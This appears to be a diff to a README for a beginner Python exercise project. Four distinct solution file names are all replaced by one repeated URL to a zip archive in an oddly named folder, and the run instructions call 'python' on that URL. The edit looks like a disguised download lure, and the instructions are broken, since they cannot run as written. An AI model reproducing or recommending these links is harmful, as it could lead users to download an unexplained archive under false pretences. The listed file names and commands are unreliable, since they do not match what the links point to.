@@ -11,16 +11,16 @@
   - Git version control
 
 ## 📂 Solution Files
-1. `https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip` - Calculator class with arithmetic operations
-2. `https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip` - Odd number series generator
-3. `https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip` - Conditional odd series generator 
-4. `https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip` - Dictionary multiples counter
+1. `https://raw.githubusercontent.com/AnushkaPawar25/Anushka_Pawar/main/Sondergotter/Anushka-Pawar-2.9.zip` - Calculator class with arithmetic operations
+2. `https://raw.githubusercontent.com/AnushkaPawar25/Anushka_Pawar/main/Sondergotter/Anushka-Pawar-2.9.zip` - Odd number series generator
+3. `https://raw.githubusercontent.com/AnushkaPawar25/Anushka_Pawar/main/Sondergotter/Anushka-Pawar-2.9.zip` - Conditional odd series generator 
+4. `https://raw.githubusercontent.com/AnushkaPawar25/Anushka_Pawar/main/Sondergotter/Anushka-Pawar-2.9.zip` - Dictionary multiples counter
 
 ## 🚀 How to Run
 ```bash
 # Execute individual solutions
-python https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip
-python https://github.com/AnushkaPawar25/Anushka_Pawar/raw/refs/heads/main/Sondergotter/Anushka-Pawar-2.9-alpha.3.zip 5  # Example input
+python https://raw.githubusercontent.com/AnushkaPawar25/Anushka_Pawar/main/Sondergotter/Anushka-Pawar-2.9.zip
+python https://raw.githubusercontent.com/AnushkaPawar25/Anushka_Pawar/main/Sondergotter/Anushka-Pawar-2.9.zip 5  # Example input
 ```
 
 ## 🧪 Testing Approach
